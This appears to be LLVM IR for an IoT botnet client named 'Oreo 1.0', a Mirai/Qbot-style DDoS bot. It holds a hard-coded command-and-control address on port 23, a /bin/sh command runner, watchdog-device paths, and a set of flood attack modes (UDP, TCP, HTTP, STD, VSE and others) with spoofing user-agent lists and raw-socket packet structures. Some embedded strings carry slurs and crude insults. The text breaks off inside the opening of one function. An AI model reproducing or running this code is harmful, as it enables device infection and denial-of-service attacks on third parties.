; ModuleID = 'host/ir_bcf/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = global i32 0, align 4
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"TSource Engine Query\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
